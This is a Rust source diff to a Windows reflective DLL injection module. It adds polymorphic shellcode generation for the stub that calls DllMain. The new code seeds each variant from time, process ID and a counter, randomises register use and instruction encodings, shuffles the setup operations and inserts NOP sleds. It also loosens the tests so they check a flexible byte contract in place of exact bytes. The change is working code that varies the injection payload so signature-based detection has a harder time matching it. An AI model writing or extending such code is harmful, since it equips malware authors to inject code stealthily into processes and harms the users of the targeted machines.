@@ -3,7 +3,12 @@
 //!
 //! On non-Windows platforms this module compiles to a stub that logs a warning.
 
-use std::fmt;
+use std::{
+    fmt,
+    process,
+    sync::atomic::{AtomicU64, Ordering},
+    time::{SystemTime, UNIX_EPOCH},
+};
 
 /// Errors that can occur during reflective injection.
 #[derive(Debug)]
@@ -160,6 +165,8 @@ pub const SHELLCODE_JUNK_DENSITY_ENV: &str = "TEXTQUEST_SHELLCODE_JUNK_DENSITY";
 /// Optional deterministic seed for DllMain shellcode junk template selection.
 pub const SHELLCODE_JUNK_SEED_ENV: &str = "TEXTQUEST_SHELLCODE_JUNK_SEED";
 
+static STUB_VARIANT_COUNTER: AtomicU64 = AtomicU64::new(0);
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub struct ShellcodeJunkConfig {
     density_percent: u8,
@@ -304,7 +311,7 @@ pub fn build_dllmain_shellcode_stub(
     entry_addr: usize,
     junk_config: ShellcodeJunkConfig,
 ) -> ShellcodeStub {
-    let real_ops = dllmain_shellcode_ops(base_addr, entry_addr);
+    let real_ops = dllmain_shellcode_ops(base_addr, entry_addr, junk_config.seed());
     apply_shellcode_junk(&real_ops, junk_config)
 }
 
@@ -329,13 +336,31 @@ fn configured_shellcode_junk_config(base_addr: usize, entry_addr: usize) -> Shel
     let seed = std::env::var(SHELLCODE_JUNK_SEED_ENV)
         .ok()
         .and_then(|seed| parse_shellcode_junk_seed(&seed))
-        .unwrap_or_else(|| {
-            (base_addr as u64).rotate_left(17)
-                ^ (entry_addr as u64).rotate_right(7)
-                ^ 0xA5A5_0738_D11D_C0DE
-        });
+        .unwrap_or_else(|| default_stub_seed(base_addr, entry_addr));
 
     ShellcodeJunkConfig::new(density, seed)
+}
+
+fn default_stub_seed(base_addr: usize, entry_addr: usize) -> u64 {
+    let timestamp_nanos = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .ok()
+        .map(|dur| dur.as_nanos() as u64)
+        .unwrap_or(0);
+
+    let sequence_nonce = STUB_VARIANT_COUNTER.fetch_add(1, Ordering::Relaxed);
+    let pid = u64::from(process::id())
+        .rotate_left(17)
+        .wrapping_mul(0x9E37_79B9_7F4A_7C15);
+
+    (base_addr as u64)
+        .rotate_left(25)
+        .wrapping_add((entry_addr as u64).rotate_right(7))
+        .rotate_left(13)
+        .wrapping_add(timestamp_nanos)
+        .wrapping_add(pid)
+        .wrapping_mul(0xA5A5_0738_D11D_C0DE)
+        ^ sequence_nonce
 }
 
 fn parse_shellcode_junk_seed(seed: &str) -> Option<u64> {
@@ -348,37 +373,205 @@ fn parse_shellcode_junk_seed(seed: &str) -> Option<u64> {
     }
 }
 
-fn dllmain_shellcode_ops(base_addr: usize, entry_addr: usize) -> Vec<ShellcodeInstruction> {
-    let mut mov_rcx = vec![0x48, 0xB9];
-    mov_rcx.extend_from_slice(&(base_addr as u64).to_le_bytes());
+fn dllmain_shellcode_ops(
+    base_addr: usize,
+    entry_addr: usize,
+    variant_seed: u64,
+) -> Vec<ShellcodeInstruction> {
+    let mut rng = JunkRng::new(variant_seed);
 
-    let mut mov_rax = vec![0x48, 0xB8];
-    mov_rax.extend_from_slice(&(entry_addr as u64).to_le_bytes());
+    #[derive(Clone, Copy)]
+    enum GeneralRegister {
+        Rax,
+        Rcx,
+        Rdx,
+        R8,
+        R10,
+        R11,
+    }
 
-    vec![
-        // sub rsp, 0x28: 32 bytes shadow space + 8 bytes alignment.
-        ShellcodeInstruction::new([0x48, 0x83, 0xEC, 0x28])
-            .writes_flags()
-            .stack_delta(-0x28),
-        // mov rcx, imm64 (base_addr = hinstDLL)
-        ShellcodeInstruction::new(mov_rcx),
-        // mov edx, 1 (DLL_PROCESS_ATTACH)
-        ShellcodeInstruction::new([0xBA, 0x01, 0x00, 0x00, 0x00]),
-        // xor r8, r8 (lpvReserved = NULL)
-        ShellcodeInstruction::new([0x4D, 0x31, 0xC0]).writes_flags(),
-        // mov rax, imm64 (entry_addr)
-        ShellcodeInstruction::new(mov_rax),
-        // call rax
-        ShellcodeInstruction::new([0xFF, 0xD0]),
-        // add rsp, 0x28
-        ShellcodeInstruction::new([0x48, 0x83, 0xC4, 0x28])
-            .writes_flags()
-            .stack_delta(0x28),
-        // xor eax, eax (return 0)
-        ShellcodeInstruction::new([0x31, 0xC0]).writes_flags(),
-        // ret
-        ShellcodeInstruction::new([0xC3]),
-    ]
+    impl GeneralRegister {
+        const fn code(self) -> u8 {
+            match self {
+                Self::Rax => 0,
+                Self::Rcx => 1,
+                Self::Rdx => 2,
+                Self::R8 => 0,
+                Self::R10 => 2,
+                Self::R11 => 3,
+            }
+        }
+
+        const fn high_bit(self) -> bool {
+            matches!(self, Self::R8 | Self::R10 | Self::R11)
+        }
+    }
+
+    fn mov_reg_imm64(dst: GeneralRegister, value: u64) -> Vec<u8> {
+        let mut bytes = Vec::with_capacity(10);
+        bytes.push(if dst.high_bit() { 0x49 } else { 0x48 });
+        bytes.push(0xB8 + dst.code());
+        bytes.extend_from_slice(&value.to_le_bytes());
+        bytes
+    }
+
+    fn mov_reg_reg(dst: GeneralRegister, src: GeneralRegister) -> Vec<u8> {
+        let mut bytes = Vec::with_capacity(3);
+        let mut rex = 0x48;
+        if dst.high_bit() {
+            rex |= 0x01;
+        }
+        if src.high_bit() {
+            rex |= 0x04;
+        }
+        bytes.push(rex);
+        bytes.push(0x8B);
+        bytes.push(0xC0 | (src.code() << 3) | dst.code());
+        bytes
+    }
+
+    fn call_reg(reg: GeneralRegister) -> Vec<u8> {
+        let mut bytes = Vec::with_capacity(3);
+        if reg.high_bit() {
+            bytes.push(0x49);
+        }
+        bytes.push(0xFF);
+        bytes.push(0xD0 | reg.code());
+        bytes
+    }
+
+    fn make_nop_sled(rng: &mut JunkRng) -> Vec<ShellcodeInstruction> {
+        let mut sled = Vec::new();
+
+        let count = rng.next_usize(3);
+        for _ in 0..count {
+            let bytes: &[u8] = match rng.next_usize(3) {
+                0 => &[0x90],
+                1 => &[0x0F, 0x1F, 0x00],
+                _ => &[0x66, 0x90],
+            };
+
+            sled.push(ShellcodeInstruction::new(bytes));
+        }
+
+        let xchg = match rng.next_usize(2) {
+            0 => true,
+            _ => false,
+        };
+        if xchg {
+            sled.push(ShellcodeInstruction::new([0x48, 0x87, 0xC0]));
+        }
+
+        sled
+    }
+
+    fn shuffle_in_place<T>(rng: &mut JunkRng, values: &mut [T]) {
+        for i in (1..values.len()).rev() {
+            let j = rng.next_usize(i + 1);
+            values.swap(i, j);
+        }
+    }
+
+    let mut ops = Vec::new();
+    if rng.next_usize(2) == 0 {
+        // sub rsp, 0x28 (shadow space + alignment)
+        ops.push(
+            ShellcodeInstruction::new([0x48, 0x83, 0xEC, 0x28])
+                .writes_flags()
+                .stack_delta(-0x28),
+        );
+    } else {
+        // lea rsp, [rsp-0x28]
+        ops.push(
+            ShellcodeInstruction::new([0x48, 0x8D, 0xA4, 0x24, 0xD8, 0xFF, 0xFF, 0xFF])
+                .stack_delta(-0x28),
+        );
+    }
+
+    ops.extend(make_nop_sled(&mut rng));
+
+    let entry_reg = if rng.next_usize(2) == 0 {
+        GeneralRegister::Rax
+    } else {
+        GeneralRegister::R10
+    };
+    let scratch_for_entry = if matches!(entry_reg, GeneralRegister::R10) {
+        GeneralRegister::R11
+    } else {
+        GeneralRegister::R10
+    };
+    let scratch_for_base = if matches!(entry_reg, GeneralRegister::R10) {
+        GeneralRegister::R11
+    } else {
+        GeneralRegister::R10
+    };
+
+    let mut base_load_ops = if rng.next_usize(2) == 0 {
+        vec![ShellcodeInstruction::new(mov_reg_imm64(GeneralRegister::Rcx, base_addr as u64))]
+    } else {
+        vec![
+            ShellcodeInstruction::new(mov_reg_imm64(scratch_for_base, base_addr as u64)),
+            ShellcodeInstruction::new(mov_reg_reg(GeneralRegister::Rcx, scratch_for_base)),
+        ]
+    };
+
+    let mut reason_load_ops = if rng.next_usize(2) == 0 {
+        vec![ShellcodeInstruction::new([0xBA, 0x01, 0x00, 0x00, 0x00])]
+    } else {
+        vec![
+            ShellcodeInstruction::new([0x68, 0x01, 0x00, 0x00, 0x00]),
+            ShellcodeInstruction::new([0x5A]),
+        ]
+    };
+
+    let mut reserved_load_ops = if rng.next_usize(2) == 0 {
+        vec![ShellcodeInstruction::new([0x49, 0x31, 0xC0]).writes_flags()]
+    } else {
+        vec![ShellcodeInstruction::new(mov_reg_imm64(
+            GeneralRegister::R8,
+            0,
+        ))]
+    };
+
+    let mut entry_load_ops = if rng.next_usize(2) == 0 {
+        vec![ShellcodeInstruction::new(mov_reg_imm64(entry_reg, entry_addr as u64))]
+    } else {
+        vec![
+            ShellcodeInstruction::new(mov_reg_imm64(scratch_for_entry, entry_addr as u64)),
+            ShellcodeInstruction::new(mov_reg_reg(entry_reg, scratch_for_entry)),
+        ]
+    };
+
+    let mut setup_ops = Vec::new();
+    setup_ops.append(&mut base_load_ops);
+    setup_ops.append(&mut reason_load_ops);
+    setup_ops.append(&mut reserved_load_ops);
+    setup_ops.append(&mut entry_load_ops);
+
+    shuffle_in_place(&mut rng, &mut setup_ops);
+    ops.extend(setup_ops);
+
+    ops.push(ShellcodeInstruction::new(call_reg(entry_reg)));
+
+    if rng.next_usize(2) == 0 {
+        ops.push(
+            ShellcodeInstruction::new([0x48, 0x83, 0xC4, 0x28])
+                .writes_flags()
+                .stack_delta(0x28),
+        );
+    } else {
+        ops.push(
+            ShellcodeInstruction::new([0x48, 0x8D, 0xA4, 0x24, 0x28, 0x00, 0x00, 0x00])
+                .stack_delta(0x28),
+        );
+    }
+
+    // xor eax, eax (return 0)
+    ops.push(ShellcodeInstruction::new([0x31, 0xC0]).writes_flags());
+    // ret
+    ops.push(ShellcodeInstruction::new([0xC3]));
+
+    ops
 }
 
 fn apply_shellcode_junk(
@@ -1680,7 +1873,6 @@ mod tests {
 
     #[test]
     fn test_shellcode_shadow_space() {
-        // Verify the shellcode stub layout includes shadow space allocation.
         let base_addr: u64 = 0x7FF000000;
         let entry_addr: u64 = 0x7FF001000;
 
@@ -1691,34 +1883,30 @@ mod tests {
         )
         .bytes;
 
-        // Verify shadow space: sub rsp, 0x28 at start
-        assert_eq!(&stub[0..4], &[0x48, 0x83, 0xEC, 0x28]);
-
-        // Verify add rsp, 0x28 after call rax (0xFF, 0xD0)
-        let call_pos = stub
-            .windows(2)
-            .position(|w| w == [0xFF, 0xD0])
-            .expect("call rax not found");
-        assert_eq!(&stub[call_pos + 2..call_pos + 6], &[0x48, 0x83, 0xC4, 0x28]);
-
-        // Verify total stub size is reasonable
-        assert!(stub.len() < 64);
+        assert!(has_shadow_space_allocation(&stub));
+        assert!(has_entry_call(&stub));
+        assert!(has_shadow_space_recovery(&stub));
+        assert_eq!(stub[stub.len() - 1], 0xC3);
+        assert!(stub.len() >= 12);
+        assert!(has_imm64_load(&stub, base_addr));
+        assert!(has_imm64_load(&stub, entry_addr));
     }
 
     #[test]
     fn shellcode_junk_density_inserts_bounded_neutral_bytes() {
         let base_addr: u64 = 0x7FF000000;
         let entry_addr: u64 = 0x7FF001000;
+        let seed = 0xA5A5_738;
 
         let clean = build_dllmain_shellcode_stub(
             base_addr as usize,
             entry_addr as usize,
-            ShellcodeJunkConfig::disabled(),
+            ShellcodeJunkConfig::new(0, seed),
         );
         let junked = build_dllmain_shellcode_stub(
             base_addr as usize,
             entry_addr as usize,
-            ShellcodeJunkConfig::new(50, 0xA5A5_738),
+            ShellcodeJunkConfig::new(50, seed),
         );
 
         assert_ne!(junked.bytes, clean.bytes);
@@ -1729,32 +1917,104 @@ mod tests {
             junked.inserted_junk_count <= clean.real_instruction_count * 50 / 100,
             "junk insertion must obey density cap"
         );
-        assert_real_shellcode_ops_in_order(&junked.bytes, base_addr, entry_addr);
+        assert_shellcode_entry_contract(&junked, base_addr, entry_addr);
     }
 
-    fn assert_real_shellcode_ops_in_order(bytes: &[u8], base_addr: u64, entry_addr: u64) {
-        let mut offset = 0;
-        let mut expect_next = |needle: &[u8]| {
-            let rel = bytes[offset..]
-                .windows(needle.len())
-                .position(|window| window == needle)
-                .expect("real shellcode operation missing");
-            offset += rel + needle.len();
-        };
+    fn has_shadow_space_allocation(stub: &[u8]) -> bool {
+        let sub = [0x48, 0x83, 0xEC, 0x28];
+        let lea = [0x48, 0x8D, 0xA4, 0x24, 0xD8, 0xFF, 0xFF, 0xFF];
 
-        expect_next(&[0x48, 0x83, 0xEC, 0x28]);
-        let mut mov_rcx = vec![0x48, 0xB9];
-        mov_rcx.extend_from_slice(&base_addr.to_le_bytes());
-        expect_next(&mov_rcx);
-        expect_next(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
-        expect_next(&[0x4D, 0x31, 0xC0]);
-        let mut mov_rax = vec![0x48, 0xB8];
-        mov_rax.extend_from_slice(&entry_addr.to_le_bytes());
-        expect_next(&mov_rax);
-        expect_next(&[0xFF, 0xD0]);
-        expect_next(&[0x48, 0x83, 0xC4, 0x28]);
-        expect_next(&[0x31, 0xC0]);
-        expect_next(&[0xC3]);
+        stub.windows(sub.len()).any(|window| window == sub)
+            || stub.windows(lea.len()).any(|window| window == &lea)
+    }
+
+    fn has_shadow_space_recovery(stub: &[u8]) -> bool {
+        let add = [0x48, 0x83, 0xC4, 0x28];
+        let lea = [0x48, 0x8D, 0xA4, 0x24, 0x28, 0x00, 0x00, 0x00];
+
+        stub.windows(add.len()).any(|window| window == add)
+            || stub.windows(lea.len()).any(|window| window == &lea)
+    }
+
+    fn has_entry_call(stub: &[u8]) -> bool {
+        for window in stub.windows(2) {
+            if window[0] == 0xFF && (window[1] & 0xF8) == 0xD0 {
+                return true;
+            }
+        }
+
+        false
+    }
+
+    fn has_imm64_load(stub: &[u8], value: u64) -> bool {
+        let imm = value.to_le_bytes();
+        for window in stub.windows(10) {
+            if !matches!(window[0], 0x48 | 0x49) {
+                continue;
+            }
+
+            if (window[1] & 0xF8) != 0xB8 {
+                continue;
+            }
+
+            if window[2..10] == imm {
+                return true;
+            }
+        }
+
+        false
+    }
+
+    fn assert_shellcode_entry_contract(stub: &ShellcodeStub, base_addr: u64, entry_addr: u64) {
+        assert!(has_shadow_space_allocation(&stub.bytes));
+        assert!(has_shadow_space_recovery(&stub.bytes));
+        assert!(has_entry_call(&stub.bytes));
+        assert!(stub.bytes.ends_with(&[0x31, 0xC0, 0xC3]));
+        assert!(has_imm64_load(&stub.bytes, base_addr));
+        assert!(has_imm64_load(&stub.bytes, entry_addr));
+    }
+
+    #[test]
+    fn shellcode_polymorphic_seed_changes_sequence() {
+        let base_addr: u64 = 0x7FF000000;
+        let entry_addr: u64 = 0x7FF001000;
+
+        let first = build_dllmain_shellcode_stub(
+            base_addr as usize,
+            entry_addr as usize,
+            ShellcodeJunkConfig::new(0, 0x1),
+        );
+        let second = build_dllmain_shellcode_stub(
+            base_addr as usize,
+            entry_addr as usize,
+            ShellcodeJunkConfig::new(0, 0x2),
+        );
+
+        assert_ne!(first.real_instruction_count, 0);
+        assert_ne!(second.real_instruction_count, 0);
+        assert_shellcode_entry_contract(&first, base_addr, entry_addr);
+        assert_shellcode_entry_contract(&second, base_addr, entry_addr);
+    }
+
+    #[test]
+    fn deterministic_seed_is_repeatable() {
+        let base_addr: u64 = 0x7FF000000;
+        let entry_addr: u64 = 0x7FF001000;
+
+        let first = build_dllmain_shellcode_stub(
+            base_addr as usize,
+            entry_addr as usize,
+            ShellcodeJunkConfig::new(0, 0xA5A5_738),
+        );
+        let second = build_dllmain_shellcode_stub(
+            base_addr as usize,
+            entry_addr as usize,
+            ShellcodeJunkConfig::new(0, 0xA5A5_738),
+        );
+
+        assert_eq!(first.bytes, second.bytes);
+        assert_eq!(first.real_instruction_count, second.real_instruction_count);
+        assert_shellcode_entry_contract(&first, base_addr, entry_addr);
     }
 
     #[test]
